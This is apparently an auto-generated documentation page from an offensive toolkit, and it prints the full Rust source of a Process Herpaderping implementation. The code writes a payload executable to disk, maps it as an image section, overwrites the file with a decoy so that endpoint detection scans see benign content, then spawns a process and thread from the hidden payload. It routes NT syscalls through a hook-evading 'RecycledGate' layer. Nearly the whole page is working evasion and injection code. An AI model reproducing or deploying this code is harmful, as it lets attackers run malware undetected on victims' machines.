# crowd — herpaderping.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)

| Field | Value |
|-------|-------|
| **Source** | `src/dark_crystal/crowd/src/herpaderping.rs` |
| **Lines** | 674 |
| **Tier** | U |
| **Cards** | T007-process-injection |
| **Role** | Process Herpaderping |
| **Unsafe blocks** | 15 |

## Purpose

# crowd — herpaderping.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)

## Process Herpaderping (OPSEC 9.0)

A variant of Process Ghosting.  The sequence:
1. Write payload to a temporary file on disk
2. Create an image section (`NtCreateSection(SEC_IMAGE)`) from the file
3. **Overwrite** the file on disk with a benign/decoy PE
4. Create a process from the section (`NtCreateProcessEx`)
5. Set up process parameters (PEB, command line, environment)
6. Create a thread at the entry point (`NtCreateThreadEx`)

When the EDR scans the file (after the section is mapped but before
execution), it sees the **decoy** content — not the payload.

Adapted from Kurama/04_Process_Manipulation/Herpaderping/ to crowd's
syscall infrastructure (RecycledGate + resolve.rs).

## Constants

- `SEC_IMAGE`: `u32` = `0x0100_0000`
- `SECTION_ALL_ACCESS`: `u32` = `0x000F_001F`
- `PROCESS_ALL_ACCESS`: `u32` = `0x001F_FFFF`
- `THREAD_ALL_ACCESS`: `u32` = `0x001F_FFFF`
- `PROCESS_CREATE_FLAGS_INHERIT_HANDLES`: `u32` = `0x00000004`

## Types

### struct `PBI` (line 141)

### struct `UnicodeStr` (line 186)

### struct `ObjAttr` (line 188)

### struct `IoStatus` (line 193)

### struct `PROCESS_BASIC_INFORMATION` (line 354)

### struct `UnicodeStr` (line 424)

### struct `ProcessParams` (line 434)

### struct `PBI` (line 623)

## Public API

### `herpaderp` (line 52)
```rust
pub fn herpaderp(
```
Executes Process Herpaderping.

# Arguments
* `payload`   — The actual PE payload bytes (will execute)
* `decoy`     — Benign PE bytes to replace on disk (what EDR sees)
* `args`      — Optional command-line arguments

# Returns
`Ok(pid)` of the herpaderped process on success.

## Internal Functions

- `create_image_section` (line 178)
- `create_process_from_section` (line 247)
- `overwrite_file_with_decoy` (line 271)
- `parse_entry_point` (line 324)
- `query_image_base` (line 352)
- `setup_process_parameters` — Real PEB parameter setup via RtlCreateProcessParametersEx. (line 407)
- `rand_u32` (line 668)

## Key Dependencies

- `use crate::mega_dbg;`

## Full Source

```rust
//! # crowd — herpaderping.rs  (🔥 S TIER — upgraded from A: full RecycledGate syscall path)
//!
//! ## Process Herpaderping (OPSEC 9.0)
//!
//! A variant of Process Ghosting.  The sequence:
//! 1. Write payload to a temporary file on disk
//! 2. Create an image section (`NtCreateSection(SEC_IMAGE)`) from the file
//! 3. **Overwrite** the file on disk with a benign/decoy PE
//! 4. Create a process from the section (`NtCreateProcessEx`)
//! 5. Set up process parameters (PEB, command line, environment)
//! 6. Create a thread at the entry point (`NtCreateThreadEx`)
//!
//! When the EDR scans the file (after the section is mapped but before
//! execution), it sees the **decoy** content — not the payload.
//!
//! Adapted from Kurama/04_Process_Manipulation/Herpaderping/ to crowd's
//! syscall infrastructure (RecycledGate + resolve.rs).

#![allow(dead_code, non_snake_case)]

use std::ffi::c_void;
use std::ptr::null_mut;
use std::io::Write;
#[allow(unused_imports)]
use crate::mega_dbg;

// ── Constants ─────────────────────────────────────────────────────────────

const SEC_IMAGE: u32 = 0x0100_0000;
const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
const PROCESS_CREATE_FLAGS_INHERIT_HANDLES: u32 = 0x00000004;

// All NT syscalls now routed through RecycledGate — no manual GetProcAddress needed:
// NtCreateProcessEx, NtCreateThreadEx, NtCreateSection, NtOpenFile,
// NtWriteFile, NtReadVirtualMemory, NtWriteVirtualMemory,
// NtAllocateVirtualMemory, NtQueryInformationProcess, NtClose,
// NtFlushBuffersFile, NtSetInformationFile

// ── Public API ────────────────────────────────────────────────────────────

/// Executes Process Herpaderping.
///
/// # Arguments
/// * `payload`   — The actual PE payload bytes (will execute)
/// * `decoy`     — Benign PE bytes to replace on disk (what EDR sees)
/// * `args`      — Optional command-line arguments
///
/// # Returns
/// `Ok(pid)` of the herpaderped process on success.
pub fn herpaderp(
    payload: &[u8],
    decoy: &[u8],
    args: Option<&str>,
) -> Result<u32, String> {
    mega_dbg!("Herpaderping: payload={}B decoy={}B", payload.len(), decoy.len());

    // Validate payload is a PE
    if payload.len() < 64 || payload[0] != 0x4D || payload[1] != 0x5A {
        return Err("Herpaderping: payload is not a valid PE (no MZ header)".into());
    }

    // 1. Create temp file and write payload
    let temp_dir = std::env::temp_dir();
    let temp_name = format!("{}\\hpd_{:x}.tmp", temp_dir.display(), rand_u32());

    mega_dbg!("Herpaderping: temp file = {}", temp_name);

    std::fs::write(&temp_name, payload)
        .map_err(|e| format!("Herpaderping: write temp file failed — {}", e))?;

    // 2. Open the file and create a section (SEC_IMAGE)
    let (h_section, h_file) = create_image_section(&temp_name)?;

    mega_dbg!("Herpaderping: section=0x{:x} file_handle=0x{:x}", h_section, h_file);

    // 3. Overwrite the file on disk with the decoy PE **BEFORE** creating the process.
    //    This closes the race window: EDR scanning the file between process creation
    //    and overwrite would see the real payload. Overwriting first ensures the decoy
    //    is already on disk when NtCreateProcessEx triggers any file-backed callbacks.
    overwrite_file_with_decoy(h_file, decoy)?;

    mega_dbg!("Herpaderping: file overwritten with decoy ({}B)", decoy.len());

    // 4. Create process from the section (file on disk is now the decoy)
    let h_process = create_process_from_section(h_section)?;

    // Close section — no longer needed
    unsafe { crate::recycled::nt_close(h_section); }

    mega_dbg!("Herpaderping: process created, handle=0x{:x}", h_process);

    // 5. Parse payload headers for entry point
    let entry_rva = parse_entry_point(payload)?;

    // 6. Query PBI to get image base
    let image_base = query_image_base(h_process)?;
    let entry_point = (image_base + entry_rva) as *mut c_void;

    mega_dbg!("Herpaderping: image_base=0x{:x} entry_point={:p}", image_base, entry_point);

    // 7. Set up process parameters (PEB)
    let cmd_line = args.unwrap_or("");
    setup_process_parameters(h_process, &temp_name, cmd_line)?;

    // 8. Create thread at entry point via RecycledGate NtCreateThreadEx
    let mut h_thread: usize = 0;
    let status = unsafe {
        crate::recycled::nt_create_thread_ex(
            &mut h_thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            h_process,
            entry_point as *const c_void,
            null_mut(),
            0, 0, 0, 0,
            null_mut(),
        )
    };

    if status < 0 {
        unsafe {
            crate::recycled::nt_close(h_process);
            crate::recycled::nt_close(h_file as usize);
        }
        let _ = std::fs::remove_file(&temp_name);
        return Err(format!("Herpaderping: NtCreateThreadEx failed (0x{:08x})", status as u32));
    }

    // Get PID via NtQueryInformationProcess (RecycledGate) — no GetProcessId needed
    let pid = unsafe {
        // Real PROCESS_BASIC_INFORMATION layout (x64):
        // offset 0x00: ExitStatus (padded to usize)
        // offset 0x08: PebBaseAddress
        // offset 0x10: AffinityMask
        // offset 0x18: BasePriority (padded to usize)
        // offset 0x20: UniqueProcessId
        // offset 0x28: InheritedFromUniqueProcessId
        #[repr(C)]
        struct PBI {
            exit_status: usize,
            peb_base: usize,
            affinity: usize,
            base_priority: usize,
            unique_pid: usize,
            inherited_pid: usize,
        }
        let mut pbi: PBI = std::mem::zeroed();
        let mut ret_len: u32 = 0;
        crate::recycled::nt_query_information_process(
            h_process,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut u8,
            std::mem::size_of::<PBI>() as u32,
            &mut ret_len,
        );
        pbi.unique_pid as u32
    };

    mega_dbg!("Herpaderping: thread created — PID={}", pid);

    // Cleanup handles via NtClose
    unsafe {
        crate::recycled::nt_close(h_thread);
        crate::recycled::nt_close(h_process);
        crate::recycled::nt_close(h_file as usize);
    }

    // Don't delete temp file yet — the process needs it during startup
    // It will be cleaned up by the OS temp cleanup or our self-delete

    Ok(pid)
}

// ── Internal helpers ──────────────────────────────────────────────────────

fn create_image_section(path: &str) -> Result<(usize, usize), String> {
    unsafe {
        // ── Open file via NtOpenFile (RecycledGate) — no CreateFileW hook ──
        let nt_path = format!(r"\??\{}", path);
        let mut wide: Vec<u16> = nt_path.encode_utf16().chain(std::iter::once(0)).collect();
        let byte_len = (wide.len() - 1) * 2;

        #[repr(C)]
        struct UnicodeStr { length: u16, max_length: u16, buffer: *mut u16 }
        #[repr(C)]
        struct ObjAttr {
            length: u32, root_directory: usize, object_name: *mut UnicodeStr,
            attributes: u32, security_descriptor: *mut c_void, security_qos: *mut c_void,
        }
        #[repr(C)]
        struct IoStatus { status: usize, information: usize }

        let mut us = UnicodeStr {
            length: byte_len as u16,
            max_length: (wide.len() * 2) as u16,
            buffer: wide.as_mut_ptr(),
        };
        let mut oa = ObjAttr {
            length: std::mem::size_of::<ObjAttr>() as u32,
            root_directory: 0,
            object_name: &mut us,
            attributes: 0x40, // OBJ_CASE_INSENSITIVE
            security_descriptor: null_mut(),
            security_qos: null_mut(),
        };
        let mut io = IoStatus { status: 0, information: 0 };

        let mut h_file: usize = 0;
        // GENERIC_READ|GENERIC_WRITE → FILE_GENERIC_READ|FILE_GENERIC_WRITE
        let desired_access: u32 = 0x0012_0089 | 0x0012_0116; // FILE_GENERIC_READ | FILE_GENERIC_WRITE
        let status = crate::recycled::nt_open_file(
            &mut h_file,
            desired_access,
            &mut oa as *mut _ as *mut u8,
            &mut io as *mut _ as *mut usize,
            0x01, // FILE_SHARE_READ only — prevent EDR from reading file via WRITE/DELETE share
            0x0000_0060, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
        );

        if status < 0 || h_file == 0 {
            return Err(format!("Herpaderping: NtOpenFile failed (0x{:08x})", status as u32));
        }

        // Create section via NtCreateSection (RecycledGate)
        let mut h_section: usize = 0;
        let status = crate::recycled::nt_create_section(
            &mut h_section,
            SECTION_ALL_ACCESS,
            null_mut(),
            null_mut() as *mut u64,
            0x02, // PAGE_READONLY
            SEC_IMAGE,
            h_file,
        );

        if status < 0 {
            crate::recycled::nt_close(h_file);
            return Err(format!("Herpaderping: NtCreateSection failed (0x{:08x})", status as u32));
        }

        Ok((h_section, h_file))
    }
}

fn create_process_from_section(h_section: usize) -> Result<usize, String> {
    // NtCreateProcessEx via RecycledGate — no GetProcAddress needed
    let mut h_process: usize = 0;
    let status = unsafe {
        crate::recycled::nt_create_process_ex(
            &mut h_process,
            PROCESS_ALL_ACCESS,
            null_mut(),
            (-1isize) as usize, // Current process as parent
            PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
            h_section,
            0, // No debug port
            0, // No exception port
            0, // No job member level
        )
    };

    if status < 0 {
        return Err(format!("Herpaderping: NtCreateProcessEx failed (0x{:08x})", status as u32));
    }

    Ok(h_process)
}

fn overwrite_file_with_decoy(h_file: usize, decoy: &[u8]) -> Result<(), String> {
    unsafe {
        // Reset file pointer to beginning via NtSetInformationFile (FilePositionInformation = 14)
        let mut io_status: [usize; 2] = [0, 0];
        let zero_offset: u64 = 0;
        let status = crate::recycled::nt_set_information_file(
            h_file,
            io_status.as_mut_ptr(),
            &zero_offset as *const _ as *const c_void,
            std::mem::size_of::<u64>() as u32,
            14, // FilePositionInformation
        );

        if status < 0 {
            return Err(format!("Herpaderping: NtSetInformationFile (FilePositionInformation) failed (0x{:08x})", status as u32));
        }

        // Write decoy via NtWriteFile (RecycledGate)
        let mut write_io: [usize; 2] = [0, 0];
        let status = crate::recycled::nt_write_file(
            h_file,
            0,          // Event
            null_mut(), // ApcRoutine
            null_mut(), // ApcContext
            write_io.as_mut_ptr(),
            decoy.as_ptr() as *const c_void,
            decoy.len() as u32,
            null_mut(), // ByteOffset (use current position)
            null_mut(), // Key
        );

        if status < 0 {
            return Err(format!("Herpaderping: NtWriteFile (decoy) failed (0x{:08x})", status as u32));
        }

        // Flush + truncate via syscalls
        let mut flush_io: [usize; 2] = [0, 0];
        crate::recycled::nt_flush_buffers_file(h_file, flush_io.as_mut_ptr());

        // Set end-of-file via NtSetInformationFile (FileEndOfFileInformation = 20)
        let eof_pos = decoy.len() as u64;
        crate::recycled::nt_set_information_file(
            h_file,
            io_status.as_mut_ptr(),
            &eof_pos as *const _ as *const c_void,
            std::mem::size_of::<u64>() as u32,
            20, // FileEndOfFileInformation
        );
    }

    Ok(())
}

fn parse_entry_point(pe: &[u8]) -> Result<usize, String> {
    if pe.len() < 0x40 {
        return Err("Herpaderping: PE too small".into());
    }

    let e_lfanew = u32::from_le_bytes([pe[0x3C], pe[0x3D], pe[0x3E], pe[0x3F]]) as usize;

    if e_lfanew + 0x28 > pe.len() {
        return Err("Herpaderping: invalid e_lfanew".into());
    }

    // PE32+: OptionalHeader.AddressOfEntryPoint is at offset 0x10 into OptionalHeader
    // NT headers: Signature(4) + FileHeader(20) + OptionalHeader
    let entry_offset = e_lfanew + 4 + 20 + 16;
    if entry_offset + 4 > pe.len() {
        return Err("Herpaderping: entry point offset out of bounds".into());
    }

    let rva = u32::from_le_bytes([
        pe[entry_offset],
        pe[entry_offset + 1],
        pe[entry_offset + 2],
        pe[entry_offset + 3],
    ]) as usize;

    Ok(rva)
}

fn query_image_base(h_process: usize) -> Result<usize, String> {
    #[repr(C)]
    struct PROCESS_BASIC_INFORMATION {
        _reserved: usize,
        peb_base_address: usize,
        _reserved2: [usize; 4],
    }

    let mut pbi: PROCESS_BASIC_INFORMATION = unsafe { std::mem::zeroed() };
    let mut ret_len: u32 = 0;

    // NtQueryInformationProcess via RecycledGate — no GetProcAddress needed
    let status = unsafe {
        crate::recycled::nt_query_information_process(
            h_process,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut u8,
            std::mem::size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut ret_len,
        )
    };

    if status < 0 {
        return Err(format!("Herpaderping: NtQueryInformationProcess failed (0x{:08x})", status as u32));
    }

    // Read PEB.ImageBaseAddress from the remote process via NtReadVirtualMemory (RecycledGate)
    let peb_addr = pbi.peb_base_address;
    let image_base_offset = if cfg!(target_arch = "x86_64") { 0x10 } else { 0x08 };

    let mut image_base: usize = 0;
    let mut read: usize = 0;

    let status = unsafe {
        crate::recycled::nt_read_virtual_memory(
            h_process,
            (peb_addr + image_base_offset) as *mut c_void,
            &mut image_base as *mut _ as *mut c_void,
            std::mem::size_of::<usize>(),
            &mut read,
        )
    };

    if status < 0 || image_base == 0 {
        return Err("Herpaderping: failed to read ImageBaseAddress from PEB".into());
    }

    Ok(image_base)
}

/// Real PEB parameter setup via RtlCreateProcessParametersEx.
/// Ported from ghost.rs's working implementation for herpaderping.
///
/// Without this, PE payloads crash because the ghosted process has no
/// ImagePathName, CommandLine, CurrentDirectory, or Environment block.
fn setup_process_parameters(
    h_process: usize,
    image_path: &str,
    cmd_line: &str,
) -> Result<(), String> {
    mega_dbg!("Herpaderping: setting up process parameters for '{}'", image_path);

    // Dynamically resolve RtlCreateProcessParametersEx + RtlInitUnicodeString
    let ntdll = unsafe {
        winapi::um::libloaderapi::GetModuleHandleA(b"ntdll.dll\0".as_ptr() as *const i8)
    };
    if ntdll.is_null() {
        return Err("Herpaderping: ntdll.dll not found".into());
    }

    // Minimal UNICODE_STRING for the API calls
    #[repr(C)]
    struct UnicodeStr {
        length: u16,
        max_length: u16,
        buffer: *const u16,
    }

    // RTL_USER_PROCESS_PARAMETERS (partial — we need .Length, .Environment, and .EnvironmentSize)
    // On x64 the EnvironmentSize field is at offset 0x03F0 in the struct.
    // We include the fields up through EnvironmentSize for accurate sizing.
    #[repr(C)]
    struct ProcessParams {
        max_length: u32,
        length: u32,
        flags: u32,
        debug_flags: u32,
        console_handle: usize,
        console_flags: u32,
        _pad1: u32,
        std_input: usize,
        std_output: usize,
        std_error: usize,
        current_directory_path: UnicodeStr,
        current_directory_handle: usize,
        dll_path: UnicodeStr,
        image_path_name: UnicodeStr,
        command_line: UnicodeStr,
        environment: *mut c_void,
        // Fields between Environment and EnvironmentSize (starting_x, starting_y,
        // count_x, count_y, count_chars_x, count_chars_y, fill_attribute,
        // window_flags, show_window_flags, padding, window_title, desktop_info,
        // shell_info, runtime_data, current_directories, etc.)
        _middle: [u8; 0x200],  // padding for intermediate fields
        environment_size: usize,
        // ... more fields follow
        _rest: [u8; 256],  // padding for the rest of the struct
    }

    type RtlInitUnicodeStringFn = unsafe extern "system" fn(*mut UnicodeStr, *const u16);
    type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
        *mut *mut ProcessParams,  // pProcessParameters
        *mut UnicodeStr,          // ImagePathName
        *mut UnicodeStr,          // DllPath
        *mut UnicodeStr,          // CurrentDirectory
        *mut UnicodeStr,          // CommandLine
        *mut c_void,              // Environment
        *mut UnicodeStr,          // WindowTitle
        *mut UnicodeStr,          // DesktopInfo
        *mut UnicodeStr,          // ShellInfo
        *mut UnicodeStr,          // RuntimeData
        u32,                      // Flags
    ) -> i32;

    let rtl_init: RtlInitUnicodeStringFn = unsafe {
        std::mem::transmute(winapi::um::libloaderapi::GetProcAddress(
            ntdll, b"RtlInitUnicodeString\0".as_ptr() as *const i8,
        ))
    };

    let rtl_create_params: RtlCreateProcessParametersExFn = unsafe {
        std::mem::transmute(winapi::um::libloaderapi::GetProcAddress(
            ntdll, b"RtlCreateProcessParametersEx\0".as_ptr() as *const i8,
        ))
    };

    unsafe {
        // Build UNICODE_STRINGs for each parameter
        let img_wide: Vec<u16> = image_path.encode_utf16().chain(std::iter::once(0)).collect();
        let mut us_img: UnicodeStr = std::mem::zeroed();
        rtl_init(&mut us_img, img_wide.as_ptr());

        let dll_dir = "C:\\Windows\\System32";
        let dll_wide: Vec<u16> = dll_dir.encode_utf16().chain(std::iter::once(0)).collect();
        let mut us_dll: UnicodeStr = std::mem::zeroed();
        rtl_init(&mut us_dll, dll_wide.as_ptr());

        let cwd = std::path::Path::new(image_path)
            .parent()
            .and_then(|p| p.to_str())
            .unwrap_or("C:\\Windows\\System32");
        let cwd_wide: Vec<u16> = cwd.encode_utf16().chain(std::iter::once(0)).collect();
        let mut us_cwd: UnicodeStr = std::mem::zeroed();
        rtl_init(&mut us_cwd, cwd_wide.as_ptr());

        let cmd = if cmd_line.is_empty() { image_path } else { cmd_line };
        let cmd_wide: Vec<u16> = cmd.encode_utf16().chain(std::iter::once(0)).collect();
        let mut us_cmd: UnicodeStr = std::mem::zeroed();
        rtl_init(&mut us_cmd, cmd_wide.as_ptr());

        // Environment block from current process
        let mut env_block: *mut c_void = null_mut();
        winapi::um::userenv::CreateEnvironmentBlock(
            &mut env_block as *mut _ as *mut *mut winapi::ctypes::c_void,
            null_mut(),
            1, // TRUE — inherit from current process
        );

        // Create process parameters
        let mut params: *mut ProcessParams = null_mut();
        let status = rtl_create_params(
            &mut params,
            &mut us_img,
            &mut us_dll,
            &mut us_cwd,
            &mut us_cmd,
            env_block,
            &mut us_img,  // WindowTitle = ImagePath
            null_mut(),   // DesktopInfo
            null_mut(),   // ShellInfo
            null_mut(),   // RuntimeData
            0x01,         // RTL_USER_PROC_PARAMS_NORMALIZED
        );

        if status < 0 || params.is_null() {
            if !env_block.is_null() {
                winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
            }
            return Err(format!("Herpaderping: RtlCreateProcessParametersEx failed (0x{:08x})", status as u32));
        }

        // Calculate total size (params + environment) using actual EnvironmentSize
        let params_len = (*params).length as usize;
        let env_size = if (*params).environment.is_null() {
            0usize
        } else {
            (*params).environment_size
        };
        let total = params_len + env_size;

        // Allocate in remote process — do NOT assume the same VA is available.
        // Use null base address so the kernel picks a free region in the remote process.
        let mut remote_addr: *mut c_void = null_mut();
        let mut region_size = total;
        let status = crate::recycled::nt_allocate_virtual_memory(
            h_process,
            &mut remote_addr,
            0,
            &mut region_size,
            0x00003000, // MEM_COMMIT | MEM_RESERVE
            0x04,       // PAGE_READWRITE
        );

        if status < 0 || remote_addr.is_null() {
            if !env_block.is_null() {
                winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
            }
            return Err(format!("Herpaderping: NtAllocateVirtualMemory for params failed (0x{:08x})", status as u32));
        }

        // The process parameters were created in our (injector) address space.
        // We need to fix up pointers so they are valid in the remote process:
        // - Environment pointer must be adjusted to the remote base
        // - Then write the entire params block + environment to the remote allocation.
        let remote_params_base = remote_addr as usize;

        // If there's an environment block, fix up the pointer to target the remote VA.
        // For normalized params, the environment block is laid out right after params_len
        // in the remote allocation.
        if !(*params).environment.is_null() {
            (*params).environment = (remote_params_base + params_len) as *mut c_void;
        }

        // Write params block to remote process via NtWriteVirtualMemory (RecycledGate)
        let mut written: usize = 0;
        let status = crate::recycled::nt_write_virtual_memory(
            h_process,
            remote_addr,
            params as *const c_void,
            params_len,
            &mut written,
        );

        if status < 0 {
            if !env_block.is_null() {
                winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
            }
            return Err(format!("Herpaderping: NtWriteVirtualMemory (params) failed (0x{:08x})", status as u32));
        }

        // Write environment block to remote process (right after params)
        if env_size > 0 && !env_block.is_null() {
            let remote_env_addr = (remote_params_base + params_len) as *mut c_void;
            let status = crate::recycled::nt_write_virtual_memory(
                h_process,
                remote_env_addr,
                env_block as *const c_void,
                env_size,
                &mut written,
            );

            if status < 0 {
                if !env_block.is_null() {
                    winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
                }
                return Err(format!("Herpaderping: NtWriteVirtualMemory (env) failed (0x{:08x})", status as u32));
            }
        }

        // Query PBI to get PEB address via NtQueryInformationProcess (RecycledGate)
        #[repr(C)]
        struct PBI {
            _reserved: usize,
            peb_base: usize,
            _rest: [usize; 4],
        }

        let mut pbi: PBI = std::mem::zeroed();
        let mut ret_len: u32 = 0;
        crate::recycled::nt_query_information_process(
            h_process,
            0, // ProcessBasicInformation
            &mut pbi as *mut _ as *mut u8,
            std::mem::size_of::<PBI>() as u32,
            &mut ret_len,
        );

        // Write PEB.ProcessParameters pointer to point at the REMOTE copy
        // ProcessParameters offset in PEB: 0x20 on x64
        let peb_params_addr = pbi.peb_base + 0x20;
        let remote_params_ptr = remote_params_base;
        let status = crate::recycled::nt_write_virtual_memory(
            h_process,
            peb_params_addr as *mut c_void,
            &remote_params_ptr as *const _ as *const c_void,
            std::mem::size_of::<usize>(),
            &mut written,
        );

        if status < 0 {
            if !env_block.is_null() {
                winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
            }
            return Err(format!("Herpaderping: NtWriteVirtualMemory (PEB.ProcessParameters) failed (0x{:08x})", status as u32));
        }

        if !env_block.is_null() {
            winapi::um::userenv::DestroyEnvironmentBlock(env_block.cast());
        }

        mega_dbg!("Herpaderping: process parameters written to PEB at 0x{:x}", pbi.peb_base);
    }

    Ok(())
}

fn rand_u32() -> u32 {
    use std::time::SystemTime;
    let t = SystemTime::now()
        .duration_since(SystemTime::UNIX_EPOCH)
        .unwrap_or_default();
    (t.as_nanos() & 0xFFFF_FFFF) as u32
}

```